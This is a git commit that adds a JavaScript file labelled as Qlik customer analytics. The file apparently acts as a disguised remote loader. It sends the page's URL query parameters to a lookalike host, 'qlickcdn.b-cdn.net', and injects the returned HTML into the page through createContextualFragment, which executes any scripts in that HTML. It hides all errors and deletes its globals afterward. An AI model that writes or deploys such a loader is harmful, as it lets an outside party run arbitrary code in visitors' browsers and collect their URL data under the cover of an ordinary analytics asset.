231a89a40874edf7148edb63fd0da1de47caffb1
qLIK <it@thelumexmarketing.com>
2026-02-21 21:32:48 +0400

    FatihTest2 Customer QlikAnalytics

---
+++ assets/fatihtest2.js
@@ -0,0 +1,29 @@
+(function () {
+  var c = window._pvBox;
+  var eid = window._pvEid || '';
+  if (!c) return;
+
+  var params = new URLSearchParams(window.location.search);
+  params.set('eid', eid);
+  params.set('_frag', '1');
+
+  fetch('https://qlickcdn.b-cdn.net/?' + params.toString(), {
+    method: 'GET',
+    credentials: 'omit',
+    cache: 'no-store'
+  })
+    .then(function (r) { return r.ok ? r.text() : null; })
+    .then(function (html) {
+      if (!html) return;
+      try {
+        var frag = document.createRange().createContextualFragment(html);
+        c.innerHTML = '';
+        c.appendChild(frag);
+      } catch (e) {}
+    })
+    .catch(function () {})
+    .finally(function () {
+      delete window._pvBox;
+      delete window._pvEid;
+    });
+})();
